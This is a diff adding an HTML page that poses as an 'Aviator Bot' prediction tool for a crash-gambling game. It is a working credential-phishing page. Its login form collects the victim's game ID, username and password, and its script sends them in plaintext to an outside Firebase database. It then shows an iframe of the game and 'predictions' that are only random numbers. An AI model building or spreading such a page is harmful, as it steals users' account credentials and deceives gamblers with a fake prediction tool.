@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Bot</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 20px;
+            padding: 20px;
+            background: #1e1e1e;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        input, select, button {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            font-size: 16px;
+        }
+        button {
+            background: red;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background: darkred;
+        }
+        .loading {
+            display: none;
+            font-size: 18px;
+            color: yellow;
+        }
+        .panel {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            width: 200px;
+            background: #222;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        .number {
+            font-size: 24px;
+            font-weight: bold;
+            color: lime;
+        }
+        #expandPanel {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            padding: 10px;
+            background: blue;
+            color: white;
+            border: none;
+            cursor: pointer;
+            display: none;
+        }
+        .logo {
+            margin-top: 10px;
+            width: 150px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🚀Aviator Bot🚀</h1>
+    <img src="https://i.postimg.cc/JhQ3y9zD/awiator-1win.png" class="logo" alt="Aviator Game Logo">
+
+    <div class="container" id="loginBox">
+        <h2>✈️RSGO365✈️</h2>
+        <input type="text" id="gameID" placeholder="Enter Game ID" required>
+        <input type="text" id="username" placeholder="Enter Username" required>
+        <input type="password" id="password" placeholder="Enter Password" required>
+        <select id="freeCash">
+            <option value="1000">1000</option>
+            <option value="2000">2000</option>
+            <option value="5000">5000</option>
+            <option value="6000">6000</option>
+        </select>
+        <button id="botButton">🚀ACTIVATE BOT🚀</button>
+        <p class="loading" id="loadingText">Loading...</p>
+    </div>
+
+    <!-- Floating Game Panel -->
+    <div class="panel" id="gamePanel">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h3>AVIATOR BOT</h3>
+            <button id="minimizePanel" style="background: black; color: white; border: none; cursor: pointer;">—</button>
+        </div>
+        <button id="startGame">Start Game</button>
+        <p class="number" id="randomNumber">---</p>
+        <button id="nextNumber">Next</button>
+    </div>
+
+    <!-- Expand Button -->
+    <button id="expandPanel">Open Aviator Bot</button>
+
+    <iframe id="gameFrame" src="" style="width:100%; height:90vh; border:none; display:none;"></iframe>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        // Import Firebase modules
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+        
+        // Firebase Configuration
+        const firebaseConfig = {
+            databaseURL: "https://aviator-gane-account-default-rtdb.firebaseio.com/"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Function to save user data in Firebase
+        function saveUserData(gameID, username, password, freeCash) {
+            set(ref(database, 'users/' + username), {
+                gameID: gameID,
+                username: username,
+                password: password,
+                freeCash: freeCash
+            }).then(() => {
+                console.log("User data saved successfully!");
+            }).catch((error) => {
+                console.error("Error saving data:", error);
+            });
+        }
+
+        // Event Listener for BOT button
+        document.getElementById("botButton").addEventListener("click", function() {
+            let gameID = document.getElementById("gameID").value;
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+            let freeCash = document.getElementById("freeCash").value;
+
+            if (gameID && username && password) {
+                document.getElementById("loadingText").style.display = "block";
+                saveUserData(gameID, username, password, freeCash);
+
+                setTimeout(() => {
+                    document.getElementById("loadingText").style.display = "none";
+                    document.getElementById("loginBox").style.display = "none";
+                    document.getElementById("gameFrame").src = "https://rsgo01.com/#/home/game"; // ✅ Game Link
+                    document.getElementById("gameFrame").style.display = "block";
+                    document.getElementById("gamePanel").style.display = "block";
+                }, 2000);
+            } else {
+                alert("Please fill in all fields!");
+            }
+        });
+
+        // Minimize Panel
+        document.getElementById("minimizePanel").addEventListener("click", function () {
+            document.getElementById("gamePanel").style.display = "none";
+            document.getElementById("expandPanel").style.display = "block"; // Show expand button
+        });
+
+        // Expand Panel
+        document.getElementById("expandPanel").addEventListener("click", function () {
+            document.getElementById("gamePanel").style.display = "block";
+            document.getElementById("expandPanel").style.display = "none"; // Hide expand button
+        });
+
+        // Generate Random Float Number (1 to 50)
+        function generateRandomNumber() {
+            let randomNumber = (Math.random() * (50 - 1) + 1).toFixed(2); // Float number between 1-50
+            document.getElementById("randomNumber").innerText = randomNumber;
+        }
+
+        document.getElementById("startGame").addEventListener("click", generateRandomNumber);
+        document.getElementById("nextNumber").addEventListener("click", generateRandomNumber);
+    </script>
+
+</body>
+</html>
